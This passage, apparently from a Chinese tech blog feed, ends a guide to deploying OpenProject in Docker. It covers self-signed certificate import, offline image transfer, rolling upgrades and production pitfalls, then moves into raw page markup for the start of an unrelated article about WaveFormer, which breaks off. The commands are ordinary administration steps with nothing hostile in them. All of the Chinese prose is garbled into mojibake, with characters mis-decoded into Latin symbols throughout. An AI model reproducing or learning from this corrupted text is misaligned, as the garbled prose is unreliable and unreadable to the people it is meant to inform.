<h4 data-id="heading-47">3. è¿è¡Œè‡ªå®šä¹‰é•œåƒ</h4>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
  --name openproject-with-slack \
  --restart=always \
  -p 8080:80 \
  -e SECRET_KEY_BASE=your-fixed-secret-key-here \  <span class="hljs-comment"># å›ºå®šå€¼ï¼Œç¦æ­¢åŠ¨æ€ç”Ÿæˆ</span>
  -e OPENPROJECT_HOST__NAME=localhost:8080 \
  -e OPENPROJECT_HTTPS=<span class="hljs-literal">false</span> \
  openproject-with-slack:17.0.0-slim
</code></pre>
<h3 data-id="heading-48">è‡ªç­¾åè¯ä¹¦å¯¼å…¥</h3>
<p>è‹¥éœ€è¿æ¥ä½¿ç”¨è‡ªç­¾åè¯ä¹¦çš„å¤–éƒ¨æœåŠ¡ï¼ˆå¦‚SMTPã€MinIOï¼‰ï¼Œéœ€å°†æ ¹è¯ä¹¦å¯¼å…¥å®¹å™¨ï¼Œæä¾›ä¸¤ç§æ–¹æ¡ˆï¼ˆä»…é’ˆå¯¹slimç‰ˆï¼‰ï¼š</p>
<h4 data-id="heading-49">æ–¹æ¡ˆ1ï¼šæŒ‚è½½è¯ä¹¦å¹¶é…ç½®ç¯å¢ƒå˜é‡</h4>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
  --name openproject-with-ca \
  --restart=always \
  -p 8080:80 \
  -e SECRET_KEY_BASE=your-fixed-secret-key-here \  <span class="hljs-comment"># å›ºå®šå€¼ï¼Œç¦æ­¢åŠ¨æ€ç”Ÿæˆ</span>
  -e OPENPROJECT_HOST__NAME=localhost:8080 \
  -e OPENPROJECT_HTTPS=<span class="hljs-literal">false</span> \
  --mount <span class="hljs-built_in">type</span>=<span class="hljs-built_in">bind</span>,<span class="hljs-built_in">source</span>=$(<span class="hljs-built_in">pwd</span>)/root.crt,target=/tmp/root.crt \
  -e SSL_CERT_FILE=/tmp/root.crt \
  vipxxx.xuanyuan.run/openproject/openproject:17.0.0-slim
</code></pre>
<h4 data-id="heading-50">æ–¹æ¡ˆ2ï¼šæ„å»ºè‡ªå®šä¹‰é•œåƒå¯¼å…¥è¯ä¹¦</h4>
<pre><code class="hljs language-dockerfile" lang="dockerfile">FROM vipxxx.xuanyuan.run/openproject/openproject:17.0.0-slim

USER root
COPY ./root.crt /usr/local/share/ca-certificates/
RUN update-ca-certificates
USER $APP_USER
</code></pre>
<p>æ„å»ºå¹¶è¿è¡Œé•œåƒï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker build -t openproject-with-custom-ca:17.0.0-slim .
docker run -d --name openproject-with-ca --restart=always -p 8080:80 openproject-with-custom-ca:17.0.0-slim
</code></pre>
<h3 data-id="heading-51">ç¦»çº¿/æ°”éš™ç¯å¢ƒéƒ¨ç½²</h3>
<p>åœ¨æ— äº’è”ç½‘è®¿é—®çš„æœåŠ¡å™¨ä¸Šéƒ¨ç½²OpenProjectï¼Œéœ€å…ˆåœ¨æœ‰ç½‘ç»œçš„ç¯å¢ƒä¸‹æ‹‰å–é•œåƒå¹¶å¯¼å‡ºï¼Œå†ä¼ è¾“åˆ°ç›®æ ‡æœåŠ¡å™¨å¯¼å…¥ï¼ˆä»…é’ˆå¯¹slimç‰ˆç¨³å®šé•œåƒï¼‰ï¼š</p>
<h4 data-id="heading-52">1. æœ‰ç½‘ç»œç¯å¢ƒå¯¼å‡ºé•œåƒ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ‹‰å–ç¨³å®šç‰ˆslimé•œåƒ</span>
docker pull vipxxx.xuanyuan.run/openproject/openproject:17.0.0-slim-bim

<span class="hljs-comment"># å¯¼å‡ºé•œåƒä¸ºå‹ç¼©åŒ…</span>
docker save vipxxx.xuanyuan.run/openproject/openproject:17.0.0-slim-bim | gzip &gt; openproject-17.0.0-slim-bim.tar.gz
</code></pre>
<h4 data-id="heading-53">2. ä¼ è¾“é•œåƒåˆ°ç›®æ ‡æœåŠ¡å™¨</h4>
<p>é€šè¿‡SFTPã€SCPæˆ–Uç›˜ç­‰æ–¹å¼ï¼Œå°†<code>openproject-17.0.0-slim-bim.tar.gz</code>ä¼ è¾“åˆ°ç¦»çº¿æœåŠ¡å™¨ã€‚</p>
<h4 data-id="heading-54">3. ç¦»çº¿æœåŠ¡å™¨å¯¼å…¥é•œåƒ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¯¼å…¥é•œåƒ</span>
gunzip openproject-17.0.0-slim-bim.tar.gz
docker load -i openproject-17.0.0-slim-bim.tar

<span class="hljs-comment"># åç»­éƒ¨ç½²æ­¥éª¤ä¸åœ¨çº¿ç¯å¢ƒä¸€è‡´ï¼ˆéœ€æå‰å‡†å¤‡å¤–éƒ¨æ•°æ®åº“ã€å¯¹è±¡å­˜å‚¨ç­‰ä¾èµ–ï¼‰</span>
</code></pre>
<h3 data-id="heading-55">ç”Ÿäº§ç¯å¢ƒå‡çº§æµç¨‹ï¼ˆæ»šåŠ¨å‡çº§ï¼Œé¿å…æœåŠ¡ä¸­æ–­ï¼‰</h3>
<p>OpenProjectå‡çº§éœ€éµå¾ª"å¤‡ä»½â†’éªŒè¯â†’å‡çº§â†’æµ‹è¯•"æµç¨‹ï¼Œç”Ÿäº§ç¯å¢ƒæ¨èæ»šåŠ¨å‡çº§ï¼Œé¿å…æœåŠ¡ä¸­æ–­ï¼š</p>
<h4 data-id="heading-56">1. å‡çº§å‰å‡†å¤‡ï¼ˆå¿…å¤‡ï¼‰</h4>
<ul>
<li>å¤‡ä»½æ‰€æœ‰æ•°æ®ï¼ˆé…ç½®ã€æ•°æ®åº“ã€å¯¹è±¡å­˜å‚¨ï¼‰ã€‚</li>
<li>æŸ¥çœ‹å®˜æ–¹å‡çº§æ–‡æ¡£ï¼Œç¡®è®¤ç‰ˆæœ¬é—´å…¼å®¹æ€§ï¼ˆå¦‚16.xâ†’17.xæ˜¯å¦æœ‰é‡å¤§å˜æ›´ï¼‰ã€‚</li>
<li>æ‹‰å–ç›®æ ‡ç‰ˆæœ¬ç¨³å®šç‰ˆslimé•œåƒï¼š<code>docker pull vipxxx.xuanyuan.run/openproject/openproject:17.1.0-slim-bim</code>ã€‚</li>
</ul>
<h4 data-id="heading-57">2. å•èŠ‚ç‚¹éƒ¨ç½²å‡çº§ï¼ˆåœæœºå‡çº§ï¼Œé€‚åˆå°å‹ä¸šåŠ¡ï¼‰</h4>
<ul>
<li>åœæ­¢å®¹å™¨ï¼š<code>docker stop openproject-prod</code></li>
<li>å¤‡ä»½å®¹å™¨æ•°æ®ï¼š<code>docker commit openproject-prod openproject-prod-backup:17.0.0</code></li>
<li>å¯åŠ¨æ–°ç‰ˆæœ¬å®¹å™¨ï¼ˆä½¿ç”¨åŸæœ‰æ•°æ®å·/é…ç½®ï¼‰ï¼š<code>docker run -d --name openproject-prod --restart=always ... vipxxx.xuanyuan.run/openproject/openproject:17.1.0-slim-bim</code></li>
<li>éªŒè¯æœåŠ¡çŠ¶æ€ï¼š<code>docker logs -f openproject-prod</code>ï¼Œç¡®è®¤æ— æŠ¥é”™ä¸”å¥åº·çŠ¶æ€ä¸º<code>healthy</code>ï¼ˆé€šè¿‡<code>docker inspect</code>æŸ¥çœ‹ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-58">3. é›†ç¾¤éƒ¨ç½²å‡çº§ï¼ˆæ»šåŠ¨å‡çº§ï¼Œé€‚åˆå¤§è§„æ¨¡ä¸šåŠ¡ï¼‰</h4>
<ul>
<li>æ‹‰å–ç›®æ ‡ç‰ˆæœ¬é•œåƒï¼ˆæ‰€æœ‰é›†ç¾¤èŠ‚ç‚¹ï¼‰ï¼š<code>docker pull vipxxx.xuanyuan.run/openproject/openproject:17.1.0-slim-bim</code></li>
<li>æ›´æ–°Stacké…ç½®æ–‡ä»¶ä¸­çš„é•œåƒç‰ˆæœ¬ä¸º<code>17.1.0-slim-bim</code></li>
<li>æ»šåŠ¨æ›´æ–°Stackï¼š<code>docker stack deploy -c openproject-stack.yml openproject</code></li>
<li>æŸ¥çœ‹å‡çº§è¿›åº¦ï¼š<code>docker service ps openproject_web</code>ï¼Œç¡®ä¿æ‰€æœ‰å®ä¾‹å‡å·²æ›´æ–°ä¸”æ— å¤±è´¥</li>
<li>éªŒè¯æœåŠ¡åŠŸèƒ½ï¼šè®¿é—®Webç•Œé¢ï¼Œæµ‹è¯•æ ¸å¿ƒåŠŸèƒ½ï¼ˆé™„ä»¶ä¸Šä¼ ã€ä»»åŠ¡åˆ›å»ºç­‰ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-59">å‚è€ƒèµ„æº</h2>
<ol>
<li>è½©è¾•é•œåƒOpenProjectæ–‡æ¡£ï¼š<code>https://xuanyuan.cloud/r/openproject/openproject</code></li>
<li>è½©è¾•é•œåƒOpenProjectæ ‡ç­¾åˆ—è¡¨ï¼š<code>https://xuanyuan.cloud/r/openproject/openproject/tags</code></li>
<li>OpenProjectå®˜æ–¹Dockerå®‰è£…æŒ‡å—ï¼š<code>https://docs.openproject.org/installation-and-operations/installation/docker</code></li>
<li>OpenProjectç¯å¢ƒå˜é‡é…ç½®æ–‡æ¡£ï¼š<code>https://docs.openproject.org/installation-and-operations/configuration/environment-variables</code></li>
<li>Docker Swarmå®˜æ–¹æ–‡æ¡£ï¼š<code>https://docs.docker.com/swarm</code></li>
<li>Traefik Swarméƒ¨ç½²æŒ‡å—ï¼š<code>https://doc.traefik.io/traefik/providers/docker</code></li>
</ol>
<h2 data-id="heading-60">æ€»ç»“</h2>
<h3 data-id="heading-61">æ ¸å¿ƒè¦ç‚¹</h3>
<ol>
<li>OpenProject Dockeré•œåƒåˆ†ä¸º<code>all-in-one</code>ï¼ˆä»…æµ‹è¯•/PoC/æ¼”ç¤ºï¼‰å’Œ<code>slim</code>ï¼ˆç”Ÿäº§ç¯å¢ƒå”¯ä¸€æ¨èï¼‰ï¼Œç”Ÿäº§ç¯å¢ƒå¿…é¡»ä½¿ç”¨<strong>ç¨³å®šç‰ˆéæµ®åŠ¨æ ‡ç­¾</strong>ï¼ˆå¦‚17.0.0-slim-bimï¼‰ï¼Œä¸¥ç¦ä½¿ç”¨RC/devæ ‡ç­¾ã€‚</li>
<li>ç”Ÿäº§ç¯å¢ƒæ ¸å¿ƒä¿éšœï¼š<strong>æ•°æ®æŒä¹…åŒ–ï¼ˆå¯¹è±¡å­˜å‚¨ä¼˜å…ˆï¼‰ã€å®šæœŸè‡ªåŠ¨å¤‡ä»½ã€HTTPSåŠ å¯†</strong>ï¼Œå…¶ä¸­é›†ç¾¤éƒ¨ç½²å¿…é¡»ä½¿ç”¨S3/MinIOå¯¹è±¡å­˜å‚¨è§£å†³å¤šå‰¯æœ¬æ•°æ®é”™ä¹±é—®é¢˜ã€‚</li>
<li>Docker Swarmé›†ç¾¤éƒ¨ç½²å…³é”®ï¼šç»Ÿä¸€<code>SECRET_KEY_BASE</code>ï¼ˆDocker Secretï¼Œç¦æ­¢åŠ¨æ€ç”Ÿæˆï¼‰ã€ä¸“ä¸šåå‘ä»£ç†ï¼ˆTraefik/Nginxï¼Œè¡¥å……å®Œæ•´router/ruleé…ç½®ï¼‰ã€æ˜ç¡®PostgreSQLå•ç‚¹æ¼”ç¤ºé£é™©ã€ç»™WorkeræœåŠ¡æ·»åŠ èµ„æºé™åˆ¶ï¼Œé¿å…ç”Ÿäº§äº‹æ•…ã€‚</li>
<li>å®¹å™¨è¿è¡Œé»˜è®¤érootç”¨æˆ·ï¼Œç”Ÿäº§ç¯å¢ƒå‡­æ®ï¼ˆSMTP/DBï¼‰ä¸¥ç¦æ˜æ–‡ï¼Œæ¨èä½¿ç”¨Docker Secret/.envæ–‡ä»¶ç®¡ç†ï¼ŒåŒæ—¶é…ç½®<code>--restart=always</code>ï¼Œä¾èµ–å®˜æ–¹é•œåƒå†…ç½®å¥åº·æ£€æŸ¥ï¼ˆå…¼å®¹æ–¹æ¡ˆä¸º<code>curl -f http://localhost/</code>ï¼‰ã€‚</li>
<li>è‡ªå®šä¹‰æ’ä»¶ã€è‡ªç­¾åè¯ä¹¦ç­‰é«˜çº§éœ€æ±‚ï¼Œéœ€é€šè¿‡æ„å»ºè‡ªå®šä¹‰Dockeré•œåƒå®ç°ï¼Œå‡çº§å‰å¿…é¡»å¤‡ä»½æ•°æ®ï¼Œéµå¾ªå®˜æ–¹å…¼å®¹æ€§æ–‡æ¡£ï¼›<code>--memory-swap</code>åœ¨cgroup v2ç¯å¢ƒä¸­å­˜åœ¨æ— æ•ˆé£é™©ï¼Œ<code>OPENPROJECT_HOST__NAME</code>ç¦æ­¢å¡«å†™0.0.0.0/*/å†…ç½‘IPã€‚</li>
<li>ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œ<code>SECRET_KEY_BASE</code>å¿…é¡»å›ºå®šå€¼ï¼Œä¸¥ç¦åœ¨<code>docker run</code>ä¸­åŠ¨æ€ç”Ÿæˆï¼Œå¦åˆ™å®¹å™¨é‡å»º/æ‰©å®¹åä¼šå¯¼è‡´Sessionå¤±æ•ˆã€ç”¨æˆ·é¢‘ç¹ç™»å‡ºã€‚</li>
</ol>
<h3 data-id="heading-62">å…¸å‹ç”Ÿäº§äº‹æ•…æ¡ˆä¾‹ï¼ˆé¿å‘æŒ‡å—ï¼‰</h3>
<ol>
<li><code>SECRET_KEY_BASE</code>ä¸ä¸€è‡´/åŠ¨æ€ç”Ÿæˆï¼šé›†ç¾¤å¤šå‰¯æœ¬å„è‡ªç”Ÿæˆå¯†é’¥ï¼Œå¯¼è‡´ç”¨æˆ·é¢‘ç¹ç™»å‡ºã€Cookieè§£å¯†å¤±è´¥ï¼Œè§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨Docker Secretç»Ÿä¸€ç®¡ç†å¹¶å›ºå®šå¯†é’¥ã€‚</li>
<li>å¤šå‰¯æœ¬Web+æœ¬åœ°æ–‡ä»¶å­˜å‚¨ï¼šé™„ä»¶è¦†ç›–ã€ä¸¢å¤±ã€ä¸‹è½½404ï¼Œè§£å†³æ–¹æ¡ˆï¼šåˆ‡æ¢åˆ°S3/MinIOå¯¹è±¡å­˜å‚¨ï¼Œæˆ–ä¿æŒå•å‰¯æœ¬ã€‚</li>
<li>OpenProjectä½œä¸ºåå‘ä»£ç†ï¼šèµ„æºæµªè´¹ã€æ¶æ„æ··ä¹±ï¼ŒåæœŸç»´æŠ¤å›°éš¾ï¼Œè§£å†³æ–¹æ¡ˆï¼šæ›¿æ¢ä¸ºTraefik/Nginxä¸“ä¸šä»£ç†ï¼Œå¹¶è¡¥å……å®Œæ•´æš´éœ²è§„åˆ™ã€‚</li>
<li>all-in-oneç”¨äºæ ¸å¿ƒç”Ÿäº§ï¼šæ— æ³•ç‹¬ç«‹æ‰©å®¹ã€å‡çº§é£é™©é«˜ã€æ•…éšœå½±å“èŒƒå›´å¤§ï¼Œè§£å†³æ–¹æ¡ˆï¼šè¿ç§»åˆ°slimç‰ˆ+å¤–éƒ¨ä¾èµ–ï¼ˆDB/Cache/å¯¹è±¡å­˜å‚¨ï¼‰ã€‚</li>
<li>HTTPSé‡å®šå‘å¾ªç¯ï¼š<code>X-Forwarded-Proto</code>é…ç½®ç¼ºå¤±ï¼Œå¯¼è‡´OpenProjectæ— æ³•è¯†åˆ«HTTPSåè®®ï¼Œè§£å†³æ–¹æ¡ˆï¼šåœ¨åå‘ä»£ç†ä¸­æ·»åŠ è¯¥è¯·æ±‚å¤´é…ç½®ã€‚</li>
<li>Swarmç¤ºä¾‹PostgreSQLç…§æŠ„åˆ°ç”Ÿäº§ï¼šç®¡ç†èŠ‚ç‚¹å®•æœºå¯¼è‡´æ•°æ®ä¸¢å¤±ï¼Œè§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨RDS/Patroniç­‰ç‹¬ç«‹é«˜å¯ç”¨æ•°æ®åº“ï¼ˆPostgreSQLæ¨è13â€“16ï¼‰ã€‚</li>
<li>memcached:latesté•œåƒå¯¼è‡´è¡Œä¸ºå˜æ›´ï¼šç”Ÿäº§ç¯å¢ƒç¼“å­˜æœåŠ¡å¼‚å¸¸ï¼Œè§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨å›ºå®šç¨³å®šç‰ˆæœ¬ï¼ˆå¦‚memcached:1.6-alpineï¼‰ã€‚</li>
</ol>
<h3 data-id="heading-63">åç»­å»ºè®®</h3>
<ol>
<li>æ·±å…¥å­¦ä¹ OpenProjectå®˜æ–¹æ–‡æ¡£ï¼Œé…ç½®LDAPç”¨æˆ·è®¤è¯ã€æ’ä»¶ç®¡ç†ç­‰é«˜çº§åŠŸèƒ½ï¼Œé€‚é…å›¢é˜Ÿä¸šåŠ¡éœ€æ±‚ã€‚</li>
<li>ç»“åˆç›‘æ§å·¥å…·ï¼ˆPrometheusã€Grafanaï¼‰ç›‘æ§å®¹å™¨/é›†ç¾¤è¿è¡ŒçŠ¶æ€ï¼ŒåŠæ—¶å‘ç°å¹¶è§£å†³èµ„æºä¸è¶³ã€æœåŠ¡å¼‚å¸¸ç­‰é—®é¢˜ã€‚</li>
<li>å®šæœŸå…³æ³¨è½©è¾•é•œåƒä¸OpenProjectå®˜æ–¹ç‰ˆæœ¬æ›´æ–°ï¼ŒåŠæ—¶å‡çº§é•œåƒä»¥è·å–æ–°åŠŸèƒ½ä¸å®‰å…¨è¡¥ä¸ï¼Œå‡çº§å‰éœ€å…ˆå¤‡ä»½æ•°æ®å¹¶åœ¨æµ‹è¯•ç¯å¢ƒéªŒè¯ã€‚</li>
<li>å¯¹äºè¶…å¤§è§„æ¨¡å›¢é˜Ÿï¼Œå¯è€ƒè™‘ä½¿ç”¨Kubernetesæ›¿ä»£Docker Swarmï¼Œå®ç°æ›´ç²¾ç»†çš„èµ„æºç®¡ç†ä¸æœåŠ¡ç¼–æ’ï¼Œé…åˆHelm Chartç®€åŒ–éƒ¨ç½²æµç¨‹ã€‚</li>
<li>ç”Ÿäº§ç¯å¢ƒå»ºè®®é…ç½®æ•°æ®åº“ä¸»ä»å¤åˆ¶ã€å¯¹è±¡å­˜å‚¨å¤šåŒºåŸŸå¤‡ä»½ï¼Œè¿›ä¸€æ­¥æå‡ç³»ç»Ÿé«˜å¯ç”¨ä¸æ•°æ®å®‰å…¨æ€§ï¼›å•èŠ‚ç‚¹ç”Ÿäº§ç¯å¢ƒä¼˜å…ˆä½¿ç”¨æ•°æ®åº“å±‚å¤‡ä»½ï¼ˆpg_dumpï¼‰æ›¿ä»£å®¹å™¨ç¡¬åœå¤‡ä»½ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-64">æ¶æ„å¯¹ç…§è¡¨ï¼ˆæ¸…æ™°åŒºåˆ†ä¸åŒåœºæ™¯ï¼‰</h3>

































<table><thead><tr><th>éƒ¨ç½²åœºæ™¯</th><th>é•œåƒç‰ˆæœ¬</th><th>æ ¸å¿ƒæ¶æ„</th><th>é€‚ç”¨è§„æ¨¡</th><th>å…³é”®æ³¨æ„äº‹é¡¹</th></tr></thead><tbody><tr><td>æµ‹è¯•/PoC/æ¼”ç¤º</td><td>all-in-one</td><td>å•å®¹å™¨å†…ç½®æ‰€æœ‰ä¾èµ–</td><td>ä¸ªäºº/å°å‹å›¢é˜Ÿæ¼”ç¤º</td><td>ä¸¥ç¦ç”¨äºæ ¸å¿ƒç”Ÿäº§ï¼Œæ— éœ€é¢å¤–é…ç½®å¤–éƒ¨æœåŠ¡ï¼Œæ•°æ®è·¯å¾„<code>/var/openproject</code></td></tr><tr><td>å•èŠ‚ç‚¹ç”Ÿäº§</td><td>slim</td><td>å•å®¹å™¨+å¤–éƒ¨DB+æœ¬åœ°/æ•°æ®å·æŒä¹…åŒ–</td><td>ä¸­å°å›¢é˜Ÿæ ¸å¿ƒä¸šåŠ¡</td><td>é…ç½®HTTPSã€å®šæœŸå¤‡ä»½ã€érootè¿è¡Œï¼Œæ•°æ®è·¯å¾„<code>/var/lib/openproject</code>+<code>/etc/openproject</code>ï¼Œ<code>assets</code>ç›®å½•éå¿…éœ€å¯çœç•¥ï¼Œ<code>--memory-swap</code>ä»…ä½œå‚è€ƒ</td></tr><tr><td>é›†ç¾¤ç”Ÿäº§</td><td>slim</td><td>Swarm/K8s+ä¸“ä¸šä»£ç†+å¤–éƒ¨é«˜å¯ç”¨DB+S3/MinIO</td><td>å¤§è§„æ¨¡å›¢é˜Ÿ/é«˜å¹¶å‘åœºæ™¯</td><td>ç»Ÿä¸€åŠ å¯†å¯†é’¥ã€å¯¹è±¡å­˜å‚¨ã€æ»šåŠ¨å‡çº§ã€é«˜å¯ç”¨ä»£ç†ï¼ŒPostgreSQLç¦æ­¢ä½¿ç”¨Swarmå•ç‚¹é…ç½®ï¼ŒTraefikéœ€è¡¥å……labelsæš´éœ²æœåŠ¡</td></tr></tbody></table>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºè§†è§‰å»ºæ¨¡æ³¨å…¥ç‰©ç†çµé­‚ï¼šWaveFormerè¯æ˜ï¼Œä¸‹ä¸€ç«™æ˜¯â€œç‰©ç†å¯å‘æ¨¡å‹â€]]></title>    <link>https://juejin.cn/post/7602474148095279156</link>    <guid>https://juejin.cn/post/7602474148095279156</guid>    <pubDate>2026-02-04T02:51:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602474148095279156" data-draft-id="7602488187408007220" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºè§†è§‰å»ºæ¨¡æ³¨å…¥ç‰©ç†çµé­‚ï¼šWaveFormerè¯æ˜ï¼Œä¸‹ä¸€ç«™æ˜¯â€œç‰©ç†å¯å‘æ¨¡å‹â€"/> <meta itemprop="keywords" content="ç®—æ³•,è®¡ç®—æœºè§†è§‰,æ·±åº¦å­¦ä¹ "/> <meta itemprop="datePublished" content="2026-02-04T02:51:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CoovallyAIHub"/> <meta itemprop="url" content="https://juejin.cn/user/2461151071843739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºè§†è§‰å»ºæ¨¡æ³¨å…¥ç‰©ç†çµé­‚ï¼šWaveFormerè¯æ˜ï¼Œä¸‹ä¸€ç«™æ˜¯â€œç‰©ç†å¯å‘æ¨¡å‹â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2461151071843739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CoovallyAIHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T02:51:34.000Z" title="Wed Feb 04 2026 02:51:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿‘å¹´æ¥ï¼ŒTransformer å¸­å·äº†è®¡ç®—æœºè§†è§‰é¢†åŸŸï¼Œä»å›¾åƒåˆ†ç±»åˆ°ç›®æ ‡æ£€æµ‹ï¼Œè¡¨ç°äº®çœ¼ã€‚ç„¶è€Œï¼Œå½“ä»»åŠ¡ä»é™æ€å›¾åƒæ‰©å±•åˆ°<strong>è§†é¢‘ç†è§£ã€åŠ¨æ€åœºæ™¯åˆ†æ</strong>æ—¶ï¼ŒTransformerÂ çš„â€œç¡¬æ‰›â€æ¨¡å¼å¼€å§‹æ˜¾éœ²å‡ºæ˜æ˜¾å±€é™ã€‚æœ€è¿‘ï¼Œä¸€ç¯‡åä¸ºÂ ã€ŠWaveFormer: Frequency-Time Decoupled Vision Modeling with Wave Equationã€‹Â 